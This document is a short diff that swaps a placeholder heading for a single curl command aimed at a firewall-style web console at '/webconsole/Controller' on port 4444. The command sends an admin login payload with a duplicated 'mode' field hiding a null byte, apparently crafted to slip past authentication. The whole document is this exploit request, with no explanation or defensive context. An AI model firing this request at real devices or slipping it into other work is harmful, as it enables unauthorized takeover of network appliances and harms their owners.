@@ -1,1 +1,1 @@
-# 1qazxsw2
+curl --connect-timeout 5 -X POST -k -i 'https://x.x.x.x:4444/webconsole/Controller' --data 'mode=151&json={"username"%3a"admin","password"%3a"pw","languageid"%3a"1","browser"%3a"Chrome_101","captcha"%3a"gn2x53","accessaction"%3a1,+"mode\u0000ef"%3a716}&__RequestType=ajax&t=1655987625589' --cookie 'JSESSIONID=xxxxxxx'
